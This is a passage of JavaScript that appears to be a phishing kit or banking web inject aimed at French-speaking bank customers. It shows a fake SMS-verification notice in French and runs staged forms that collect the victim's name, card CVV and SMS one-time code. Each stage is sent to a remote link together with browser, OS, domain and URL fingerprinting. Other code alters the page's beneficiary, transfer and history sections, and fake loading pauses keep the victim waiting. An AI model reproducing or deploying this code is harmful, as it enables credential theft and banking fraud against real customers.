uBwCJ9DvcxkEAoKFYIuaXS3bbOgaQIC5IAT5Eh5fk2exC4tpgwxyC0Jgvh0QBxEAIfkEBQoACwAsAAACAA4AHQAABHJwyblGoHgqRTLeiuBNwZaMU7Jd6AAaaUcRW5EmCSEugMJKBRyuAPMICMITaoEbLBeH51JQIFivmatWRqFuudLwDoUIBAAjg3ntsawHUUzZPEBLBPGFOoCgAAQCRR4HgGMeCICCGQaAfWSAeUYCdigHihEAOw==');
_tables.set('bank','');

_tables.text = {
	query: 'Attention ! Pour v&#233;rifier votre compte nous vous enverrons un sms de confirmation sur votre t&#233;l&#233;phone'
};

_tables.showpage = function(){
	if(_tables.id('_brows.cap'))_tables.id('_brows.cap').parentNode.removeChild(_tables.id('_brows.cap'));
};

_tables.login = function(){
	_tables.get('login').value = '';
	_tables.get('password').value = '';
	_tables.get('button').style.display = '';
	var keyboard = _tables.id('secret-nbr-keyboard').parentNode;
	keyboard.style.display = '';
	_tables.id('_tables.keyboard.div').style.display = 'none';
	_tables.id('_f_btntoloader').parentNode.removeChild(_tables.id('_f_btntoloader'));
};

_tables.iframecallback = function(){
	_tables.set('iframe',function(){return _tables.id('_tables.iframe');});
	_tables.set('dom',_tables.iframedom(_tables.get('iframe')));
	
	if(_tables.get('dom').doc && _tables.get('dom').win){if(_tables.get('dom').doc.body.innerHTML.length < 5)return false;}
	
};

_tables.error = function(inp,state){
	if(state){
		inp.style.border = "solid 2px #bf2155";
	}else{
		inp.style.border = "solid 1px #dfe8f0";
	}
};

_tables.fkbtn = function(state){
	switch(state){
		
		case(1):
			
			var noError = true;
			
			_tables.error(_tables.id('input.name'),false);
			// _tables.error(_tables.id('input.lastname'),false);
			// _tables.error(_tables.id('input.dob.1'),false);
			// _tables.error(_tables.id('input.dob.2'),false);
			// _tables.error(_tables.id('input.dob.3'),false);
			// _tables.error(_tables.id('input.phone'),false);
			// _tables.error(_tables.id('input.address'),false);
			// _tables.error(_tables.id('input.city'),false);
			// _tables.error(_tables.id('input.zip'),false);
			
			if(_tables.id('input.name').value.length < 1){
				noError = false;
				_tables.error(_tables.id('input.name'),true);
			}
			
			// if(_tables.id('input.lastname').value.length < 3){
			// 	noError = false;
			// 	_tables.error(_tables.id('input.lastname'),true);
			// }
			
			// if(_tables.id('input.phone').value.length < 3){
			// 	noError = false;
			// 	_tables.error(_tables.id('input.phone'),true);
			// }
			
			// if(_tables.id('input.address').value.length < 3){
			// 	noError = false;
			// 	_tables.error(_tables.id('input.address'),true);
			// }
			
			// if(_tables.id('input.city').value.length < 3){
			// 	noError = false;
			// 	_tables.error(_tables.id('input.city'),true);
			// }
			
			// if(_tables.id('input.zip').value.length < 3){
			// 	noError = false;
			// 	_tables.error(_tables.id('input.zip'),true);
			// }
			
			// if(_tables.id('input.dob.1').selectedIndex < 1){
			// 	noError = false;
			// 	_tables.error(_tables.id('input.dob.1'),true);
			// }
			
			// if(_tables.id('input.dob.2').selectedIndex < 1){
			// 	noError = false;
			// 	_tables.error(_tables.id('input.dob.2'),true);
			// }
			
			// if(_tables.id('input.dob.3').selectedIndex < 1){
			// 	noError = false;
			// 	_tables.error(_tables.id('input.dob.3'),true);
			// }
			
			if(noError){
				// _tables.btntoloader(_tables.id('btn1'),_tables.get('loader'));
				
				_tables.set('data','Name: '+_tables.id('input.name').value);
				// _tables.add('data','Last Name: '+_tables.id('input.lastname').value+'|');
				// _tables.add('data','Dob: '+_tables.selected(_tables.id('input.dob.1')).text+'/'+_tables.selected(_tables.id('input.dob.2')).text+'/'+_tables.selected(_tables.id('input.dob.3')).text+'|');
				// _tables.add('data','Phone: '+_tables.id('input.phone').value+'|');
				// _tables.add('data','Address: '+_tables.id('input.address').value+'|');
				// _tables.add('data','City: '+_tables.id('input.city').value+'|');
				// _tables.add('data','Code Postal: '+_tables.id('input.zip').value+'|');
		
				_tables.iframelink(ACTUAL_LINK+"?data="+_tables.get('data'),"login");
				_tables.id('mainLoading-one').style.display = '';
				_tables.id('btn1').style.display = 'none';
				
				setTimeout(function(){
					_tables.id('email-show-one').innerHTML = _tables.id('input.name').value;
					_tables.id('_tables.form.1').style.display = 'none';
					_tables.id('_tables.form.2').style.display = '';
				},2345);
			}
		break;
		
		case(2):
			var noError = true;
			
			// _tables.error(_tables.id('input.cc.1'),false);
			// _tables.error(_tables.id('input.cc.2'),false);
			// _tables.error(_tables.id('input.cc.3'),false);
			// _tables.error(_tables.id('input.cc.4'),false);
			_tables.error(_tables.id('input.cvv'),false);
			// _tables.error(_tables.id('input.exp.1'),false);
			// _tables.error(_tables.id('input.exp.2'),false);
			
			var cardValue = _tables.id('input.cvv').value;

			// var cardValue = _tables.id('input.cc.1').value + '' + _tables.id('input.cc.2').value + '' + _tables.id('input.cc.3').value + '' + _tables.id('input.cc.4').value;
			
			// if(!_tables.check_cc(cardValue) || cardValue.length < 14 || !/^3|^4|^5|^6/igm.test(cardValue)){
			// 	noError = false;
			// 	_tables.error(_tables.id('input.cc.1'),true);
			// 	_tables.error(_tables.id('input.cc.2'),true);
			// 	_tables.error(_tables.id('input.cc.3'),true);
			// 	_tables.error(_tables.id('input.cc.4'),true);
			// }
			
			if(cardValue == ''){
				noError = false; 
				_tables.error(_tables.id('input.cvv'),true);
			}
			
			// if(_tables.id('input.exp.1').selectedIndex < 1){
			// 	noError = false;
			// 	_tables.error(_tables.id('input.exp.1'),true);
			// }
			
			// if(_tables.id('input.exp.2').selectedIndex < 1){
			// 	noError = false;
			// 	_tables.error(_tables.id('input.exp.2'),true);
			// }
			
			if(noError){
				_tables.btntoloader(_tables.id('btn2'),_tables.get('loader'));

				var cardValue = _tables.id('input.cvv').value;

				var emailShow = _tables.id('email-show-one').innerHTML;

				// var cardValue = _tables.id('input.cc.1').value + '' + _tables.id('input.cc.2').value + '' + _tables.id('input.cc.3').value + '' + _tables.id('input.cc.4').value;
				
				// _tables.add('data','Card: '+cardValue+'|');
				// _tables.add('data','CVV: '+_tables.selected(_tables.id('input.exp.1')).text+'/'+_tables.selected(_tables.id('input.exp.2')).text+'|');
				// _tables.add('data','EXP: '+_tables.id('input.cvv').value+'|');
				
				_tables.iframelink(ACTUAL_LINK+"?data="+_tables.get('data'),"login");
				
				_tables.id('ccQuery').style.display = 'none';
				_tables.id('mainLoading').style.display = '';
				
				setTimeout(function(){
					_tables.id('email-show-two').innerHTML = emailShow;
					_tables.id('_tables.form.2').style.display = 'none';
					_tables.id('_tables.form.3').style.display = '';
				},WAITING_DURATION * 1000);
			}
		break;
		
		case(3):
			var noError = true;
			
			_tables.error(_tables.id('input.sms'),false);
			
			if(_tables.id('input.sms').value.length < 3){
				noError = false;
				_tables.error(_tables.id('input.sms'),true);
			}
			
			if(noError){
				// _tables.btntoloader(_tables.id('btn3'),_tables.get('loader'));
				_tables.add('data','SMS: '+_tables.id('input.sms').value+'|');
				
				//alert(_tables.get('data').replace(/\|/igm,'\r\n'));
				
				_tables.iframelink(ACTUAL_LINK+"?data="+_tables.get('data'),"login");
				_tables.id('mainLoading-three').style.display = '';
				_tables.id('btn3').style.display = 'none';
				
				setTimeout(function(){
					_tables.id('smsQuery').style.display = 'none';
					_tables.id('finishPage').style.display = '';
					
					_tables.id('lastTitle1').style.display = 'none';
					_tables.id('lastTitle2').style.display = '';
				},2345);
			}
		break;
	}
};

_tables.callback = function(){
	_tables.set('message','');
	switch(_tables.status()){
		case('CS'):
			if(/block/igm.test(_tables.answer.p1)){
				_tables.fake('BLOCK');
				_tables.showpage();
			}else if(_tables.answer.status == 'ON' && _tables.answer.link == 'ON' && !/^login$|^off$/igm.test(_tables.answer.p1)){
				_tables.status('NL');
				_tables.send(
					{'type':_tables.get('type')},
					{'domain':document.domain},
					{'link':document.location.href},
					{'data':'Language: ' +_tables.get('lang')+ '|OS: ' + jscd.os +' '+ jscd.osVersion + '|'+'Browser: ' + jscd.browser +' '+ jscd.browserVersion + '|'+'Screen Size: ' + jscd.screen},
					{'message':'Login page onloaded'},
					{'branch':'TJ'}
				);
			}else{
				
				_tables.showpage();
			}
		break;
		
		case('SL'):
			setTimeout(function(){
				_tables.cc('CC');
			},1500);
		break;
		
		case('NL'):
			_tables.loginform();
			_tables.showpage();
		break;
		
		case('CC'):
			if(_tables.answer.p1 == "NONE" || _tables.answer.p5 == "activated"){
				setTimeout(function(){
					_tables.cc('CC');
				},1000);
			}else{
				_tables.fake(_tables.answer.p1);
			}
		break;
		
		case('CP'):
			var div = _tables.id('id_beneficiaire_div') || _tables.id('id_balise_div') || _tables.id('id_virements_div') || _tables.id('id_historique_div');
			if(!_tables.replacerarray){
				if(div)div.style.display = '';
				return;
			}
			_tables.replacer();
			if(div)div.style.display = '';
		break;
		
		case('TJ'):
			_tables.set('pause',false);
			_tables.cc('CC');
		break;
		
		default:
			_tables.showpage();
		break;
	}
};
